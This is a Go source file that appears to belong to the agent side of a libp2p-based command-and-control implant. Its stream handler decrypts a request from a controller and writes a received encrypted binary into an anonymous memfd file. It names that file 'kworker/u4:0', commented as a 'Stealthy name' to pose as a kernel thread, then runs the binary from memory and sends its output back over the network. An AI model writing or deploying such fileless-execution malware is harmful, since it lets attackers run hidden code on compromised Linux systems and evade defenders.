//go:build !controller && linux
// +build !controller,linux

package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"strings"

	"github.com/libp2p/go-libp2p/core/network"
	"golang.org/x/sys/unix"
)

func handleMemExecStream(s network.Stream) {
	defer s.Close()

	// Read request (encrypted JSON)
	reader := bufio.NewReader(s)
	encryptedReq, err := reader.ReadString('\n')
	if err != nil {
		return
	}

	reqJSON, err := securityMgr.DecryptString(strings.TrimSpace(encryptedReq))
	if err != nil {
		s.Write([]byte("Error: Decrypt failed: " + err.Error() + "\n"))
		return
	}

	var req MemExecRequest
	if json.Unmarshal([]byte(reqJSON), &req) != nil {
		s.Write([]byte("Error: JSON unmarshal failed\n"))
		return
	}

	// Create anonymous file in memory
	fd, err := unix.MemfdCreate("kworker/u4:0", 0) // Stealthy name
	if err != nil {
		s.Write([]byte("Error: memfd_create failed: " + err.Error() + "\n"))
		return
	}

	// Open the file descriptor as a Go file
	filename := fmt.Sprintf("/proc/self/fd/%d", fd)
	file := os.NewFile(uintptr(fd), filename)
	defer file.Close()

	// Receive encrypted binary and write to memory file
	if err := receiveEncryptedFile(reader, file, req.Size); err != nil {
		s.Write([]byte("Error: receive failed: " + err.Error() + "\n"))
		return
	}

	// Execute
	cmd := exec.Command(filename, req.Args...)
	cmd.Stdout = s
	cmd.Stderr = s
	
	if err := cmd.Run(); err != nil {
		s.Write([]byte("Error: execution failed: " + err.Error() + "\n"))
	}
}
